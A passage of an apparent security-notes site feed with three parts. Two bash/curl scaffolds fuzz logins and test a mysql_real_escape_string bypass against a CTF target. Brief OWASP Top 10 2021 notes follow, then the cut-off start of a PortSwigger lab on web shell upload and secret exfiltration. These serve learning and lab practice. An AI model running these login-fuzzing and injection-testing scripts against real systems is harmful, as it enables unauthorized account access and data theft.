  &lt;a href=&#34;#check-to-see-if-a-user-login-is-correct-in-a-bash-script&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h3&gt;
&lt;p&gt;The following script can be used to verify that a username and login is correct. It is meant to be a basic scaffold for you to build a fit for purpose fuzzer using cURL and Bash. It will check the response length characters to see if it is a valid response. You will need to adjust the expected character count for your application.&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;shell&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/bin/bash
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;result&lt;span style=&#34;color:#f92672&#34;&gt;=(&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;curl --data &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;email=&lt;/span&gt;$2&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;amp;password=&lt;/span&gt;$3&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$1&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; 2&amp;gt;/dev/null | wc -c&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo $result
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$result&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;zero&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;NOT zero&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Here is the script in action:&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;shell&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ ./check_user.sh http://10.10.10.10/login.php test@test.com testpassword
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;NOT zero&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&#34;automate-user-creation-and-test-for-mysql_real_escape_string-bypass&#34;&gt;
  Automate user creation and test for mysql_real_escape_string bypass
  &lt;a href=&#34;#automate-user-creation-and-test-for-mysql_real_escape_string-bypass&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h3&gt;
&lt;p&gt;The following is a basic scaffold for you to build a fit for purpose fuzzer using cURL and Bash. Here is a bash script I created for a CTF to validate a theory I had about its use of the PHP mysql_real_escape_string method:&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;shell&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/bin/bash
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Test for mysql_real_escape_string&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;email&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;test@test.com
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;password&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1234567890123456789012345678901234567890123456789012345678901234567890123456789&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;fuzz&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;AA&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;AA&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;10.10.10.10&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Creating User: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;email&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl -i -b &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;cookies.txt&amp;#39;&lt;/span&gt; -c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;cookies.txt&amp;#39;&lt;/span&gt; -d &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;name=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;name&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;amp;email=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;email&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;amp;password=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;password&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;amp;type=Admin&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;ip&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;/index.php&amp;#34;&lt;/span&gt; 2&amp;gt;/dev/null
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;============================================&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Login as User&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;============================================&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl -i -c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;cookies.txt&amp;#39;&lt;/span&gt; -d &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;email=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;email&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;amp;password=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;password&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;amp;type=Admin&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;ip&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;/index.php&amp;#34;&lt;/span&gt; 2&amp;gt;/dev/null  | grep &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;location&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;============================================&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Check user profile with cookie&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;============================================&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl -b &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;cookies.txt&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;ip&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;/index.php&amp;#34;&lt;/span&gt; -v 2&amp;gt;/dev/null | grep &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;td align=&amp;#34;center&amp;#34;&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;============================================&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Change Name&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;============================================&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl -b &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;cookies.txt&amp;#39;&lt;/span&gt; -d &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;name=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;fuzz&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;amp;type=Admin&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;1&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;/index.php&amp;#34;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl -b &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;cookies.txt&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;ip&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;/profile.php&amp;#34;&lt;/span&gt; 2&amp;gt;/dev/null | grep &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;td align=&amp;#34;center&amp;#34;&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; DELETEING COOKIE &amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rm cookies.txt
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;============================================&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Relogin as User - did password change?&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;============================================&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl -i -c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;cookies.txt&amp;#39;&lt;/span&gt; -d &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;email=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;email&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;amp;password=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;password&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;amp;type=Admin&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;ip&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;/index.php&amp;#34;&lt;/span&gt;  2&amp;gt;/dev/null  | grep &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;location&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; DONE!&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; DELETEING COOKIE &amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rm cookies.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
</content>
    </item>
    <item>
      <title></title>
      <link>http://localhost:1313/archive/notes/1-web-applications/1b-owasp-top-10-2021/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>

      <guid>http://localhost:1313/archive/notes/1-web-applications/1b-owasp-top-10-2021/</guid>
      <description>&lt;h1 id=&#34;1b---owasp-top-10-2021&#34;&gt;
  1b - OWASP TOP 10 2021
  &lt;a href=&#34;#1b---owasp-top-10-2021&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h1&gt;

&lt;h2 id=&#34;1-broken-access-control&#34;&gt;
  1. Broken Access Control
  &lt;a href=&#34;#1-broken-access-control&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;An application has multiple access points from the outside. The goal of Access Control is to allow authorized users to access it and block unauthorized users. BAC means that an unauthorized user will gain access to the data of an authorized user. For example, by using an API.&lt;/p&gt;

&lt;h2 id=&#34;2-cryptographic-failures&#34;&gt;
  2. Cryptographic Failures
  &lt;a href=&#34;#2-cryptographic-failures&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Weak encryption of sensitive information or no encryption at all. &lt;/li&gt;
&lt;li&gt;Certificate management &lt;/li&gt;
&lt;li&gt;Downgrade attacks &lt;/li&gt;
&lt;li&gt;Automatic encryption (good) &amp;amp; automatic decryption (bad)&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;3-injection&#34;&gt;
  3. Injection
  &lt;a href=&#34;#3-injection&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;LDAP&lt;/li&gt;
&lt;li&gt;SQL&lt;/li&gt;
&lt;li&gt;XSS&lt;/li&gt;
&lt;li&gt;Incorrect Sanitization&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;4-insecure-design&#34;&gt;
  4. Insecure Design
  &lt;a href=&#34;#4-insecure-design&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;Related to application design and architectural flaws. Anything that can be exploited by an attacker to cause damage is Insecure Design.&lt;/p&gt;</description>
      <content>
&lt;h1 id=&#34;1b---owasp-top-10-2021&#34;&gt;
  1b - OWASP TOP 10 2021
  &lt;a href=&#34;#1b---owasp-top-10-2021&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h1&gt;

&lt;h2 id=&#34;1-broken-access-control&#34;&gt;
  1. Broken Access Control
  &lt;a href=&#34;#1-broken-access-control&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;An application has multiple access points from the outside. The goal of Access Control is to allow authorized users to access it and block unauthorized users. BAC means that an unauthorized user will gain access to the data of an authorized user. For example, by using an API.&lt;/p&gt;

&lt;h2 id=&#34;2-cryptographic-failures&#34;&gt;
  2. Cryptographic Failures
  &lt;a href=&#34;#2-cryptographic-failures&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Weak encryption of sensitive information or no encryption at all. &lt;/li&gt;
&lt;li&gt;Certificate management &lt;/li&gt;
&lt;li&gt;Downgrade attacks &lt;/li&gt;
&lt;li&gt;Automatic encryption (good) &amp;amp; automatic decryption (bad)&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;3-injection&#34;&gt;
  3. Injection
  &lt;a href=&#34;#3-injection&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;LDAP&lt;/li&gt;
&lt;li&gt;SQL&lt;/li&gt;
&lt;li&gt;XSS&lt;/li&gt;
&lt;li&gt;Incorrect Sanitization&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;4-insecure-design&#34;&gt;
  4. Insecure Design
  &lt;a href=&#34;#4-insecure-design&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;Related to application design and architectural flaws. Anything that can be exploited by an attacker to cause damage is Insecure Design.&lt;/p&gt;

&lt;h2 id=&#34;5-security-misconfiguration&#34;&gt;
  5. Security Misconfiguration
  &lt;a href=&#34;#5-security-misconfiguration&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Non-latest features&lt;/li&gt;
&lt;li&gt;Delayed Updates&lt;/li&gt;
&lt;li&gt;Non-removed testing application on the server(have a known vulnerability, open ports)&lt;/li&gt;
&lt;li&gt;error message(non-handled exceptions, detalis)&lt;/li&gt;
&lt;li&gt;TLS&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;6-vulnerable-and-outdated-components&#34;&gt;
  6. Vulnerable and Outdated Components
  &lt;a href=&#34;#6-vulnerable-and-outdated-components&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;know vulnerabilities&lt;/li&gt;
&lt;li&gt;external components&lt;/li&gt;
&lt;li&gt;external libraries&lt;/li&gt;
&lt;li&gt;frameworks&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;7-identification-and-authentication-failures&#34;&gt;
  7. Identification and Authentication Failures
  &lt;a href=&#34;#7-identification-and-authentication-failures&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;User auth and identification problems&lt;/li&gt;
&lt;li&gt;Session timeout&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;8-software-and-data-integrity-failures&#34;&gt;
  8. Software and Data Integrity Failures
  &lt;a href=&#34;#8-software-and-data-integrity-failures&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;basically it means making software changes without checking CI/CD integrity and authenticity.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;updates are not verified before updating - attacker can change software&lt;/li&gt;
&lt;li&gt;monitoring software source was infiltrated and then pushed this compromised software to endpoints.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;9-security-logging-and-monitoring-failures&#34;&gt;
  9. Security Logging and Monitoring Failures
  &lt;a href=&#34;#9-security-logging-and-monitoring-failures&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;insufficient logging and monitoring&lt;/li&gt;
&lt;li&gt;leaving out important asset monitoring and logging&lt;/li&gt;
&lt;li&gt;alerts for suspicious activities&lt;/li&gt;
&lt;li&gt;log file storage should not be only locally(backup)&lt;/li&gt;
&lt;li&gt;alert threshold&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;10-server-side-request-forgery&#34;&gt;
  10. Server Side Request Forgery
  &lt;a href=&#34;#10-server-side-request-forgery&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;SSRF occurs when web application fetches remote resource without validating user-supplied request/url. fetching an url is common feature nowadays.&lt;/p&gt;
&lt;p&gt;during SSRF an attacker FORGES a request that can retrieve unauthorized data from the server back to an attacker.&lt;/p&gt;
</content>
    </item>
    <item>
      <title></title>
      <link>http://localhost:1313/archive/notes/1-web-applications/1f-file-upload-vulnerabilities/1f1-remote-code-execution-via-web-shell-upload-portswigger-lab/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>

      <guid>http://localhost:1313/archive/notes/1-web-applications/1f-file-upload-vulnerabilities/1f1-remote-code-execution-via-web-shell-upload-portswigger-lab/</guid>
      <description>&lt;h1 id=&#34;1f1---remote-code-execution-via-web-shell-upload-portswigger-lab&#34;&gt;
  1f1 - Remote code execution via web shell upload [PortSwigger Lab]
  &lt;a href=&#34;#1f1---remote-code-execution-via-web-shell-upload-portswigger-lab&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h1&gt;
&lt;p&gt;This lab contains a vulnerable image upload function. It doesn&amp;rsquo;t perform any validation on the files users upload before storing them on the server&amp;rsquo;s filesystem.&lt;/p&gt;
&lt;p&gt;To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file &lt;code&gt;/home/carlos/secret&lt;/code&gt;. Submit this secret.&lt;/p&gt;
&lt;p&gt;You can log in to your own account using the following credentials: &lt;code&gt;wiener:peter&lt;/code&gt;&lt;/p&gt;</description>
      <content>
&lt;h1 id=&#34;1f1---remote-code-execution-via-web-shell-upload-portswigger-lab&#34;&gt;
